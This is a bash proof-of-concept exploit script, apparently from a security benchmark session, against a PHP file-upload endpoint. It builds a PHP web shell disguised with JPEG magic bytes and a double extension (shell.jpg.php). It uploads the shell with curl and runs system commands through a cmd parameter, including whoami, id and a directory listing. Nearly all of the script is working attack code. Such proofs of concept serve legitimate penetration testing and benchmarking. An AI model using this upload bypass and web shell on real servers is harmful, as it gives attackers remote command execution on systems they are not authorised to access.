#!/bin/bash
# POC: Demonstrates PHP handler bypass RCE via double extension (shell.jpg.php) that bypasses extension validation but executes as PHP
# Target: ./repo
# Created: 2025-11-07T19:26:20.754Z
# Session: benchmark-XBEN-067-24-mhp8bhdm

# PHP Handler Bypass RCE POC
# Demonstrates uploading shell.jpg.php to bypass extension validation
# while still executing as PHP code

set -e

TARGET_URL="${1:-http://localhost:8080}"
UPLOAD_ENDPOINT="/upload.php"
UPLOAD_DIR="/upload/"

echo "[*] PHP Handler Bypass RCE POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Create malicious PHP file with JPG magic bytes
echo "[*] Step 1: Creating shell.jpg.php with JPG magic bytes and PHP payload"

# Create a temporary file with JPG magic bytes (FFD8 FFE0) followed by PHP code
PAYLOAD_FILE="/tmp/shell.jpg.php"
TEMP_PAYLOAD="/tmp/payload.tmp"

# Write JPG magic bytes (FFD8 FFE0 - JPEG SOI marker)
printf '\xFF\xD8\xFF\xE0' > "$TEMP_PAYLOAD"

# Append PHP code
cat >> "$TEMP_PAYLOAD" << 'EOF'
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    echo "Command: " . htmlspecialchars($_GET['cmd']) . "\n";
    echo "Output:\n";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "PHP Execution Successful!";
}
?>
EOF

cp "$TEMP_PAYLOAD" "$PAYLOAD_FILE"
echo "[+] Payload file created: $PAYLOAD_FILE"
echo "[+] File size: $(stat -f%z "$PAYLOAD_FILE" 2>/dev/null || stat -c%s "$PAYLOAD_FILE") bytes"
echo "[+] First bytes (hex): $(xxd -p -l 16 "$PAYLOAD_FILE" | head -c 16)"
echo ""

# Step 2: Upload the file
echo "[*] Step 2: Uploading shell.jpg.php to $TARGET_URL$UPLOAD_ENDPOINT"

UPLOAD_RESPONSE=$(curl -s -X POST \
  -F "file=@$PAYLOAD_FILE" \
  "$TARGET_URL$UPLOAD_ENDPOINT" 2>&1)

echo "[+] Upload response:"
echo "$UPLOAD_RESPONSE"
echo ""

# Step 3: Check if file exists in upload directory
echo "[*] Step 3: Checking if shell.jpg.php was uploaded"

FILE_EXISTS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$UPLOAD_DIR/shell.jpg.php")
echo "[+] HTTP Status for shell.jpg.php: $FILE_EXISTS"

if [ "$FILE_EXISTS" = "200" ]; then
    echo "[+] File successfully uploaded and accessible"
else
    echo "[-] File not found or not accessible (HTTP $FILE_EXISTS)"
fi
echo ""

# Step 4: Execute PHP code via parameter
echo "[*] Step 4: Attempting PHP execution with whoami command"

RCE_OUTPUT=$(curl -s "$TARGET_URL$UPLOAD_DIR/shell.jpg.php?cmd=whoami")
echo "[+] Response:"
echo "$RCE_OUTPUT"
echo ""

# Check if we got PHP execution
if echo "$RCE_OUTPUT" | grep -q "www-data\|root\|output"; then
    echo "[+] PHP EXECUTION CONFIRMED!"
    echo "[+] Vulnerability successfully exploited"
else
    echo "[-] PHP execution not confirmed in response"
fi
echo ""

# Step 5: Execute additional command to prove RCE
echo "[*] Step 5: Running 'id' command to further prove RCE"

ID_OUTPUT=$(curl -s "$TARGET_URL$UPLOAD_DIR/shell.jpg.php?cmd=id")
echo "[+] ID output:"
echo "$ID_OUTPUT"
echo ""

# Step 6: Execute 'ls -la /upload' to show uploaded files
echo "[*] Step 6: Listing upload directory contents"

LS_OUTPUT=$(curl -s "$TARGET_URL$UPLOAD_DIR/shell.jpg.php?cmd=ls%20-la%20/upload")
echo "[+] Directory listing:"
echo "$LS_OUTPUT"
echo ""

# Cleanup
rm -f "$PAYLOAD_FILE" "$TEMP_PAYLOAD"
echo "[*] Cleanup: Removed temporary files"
echo "[+] POC completed"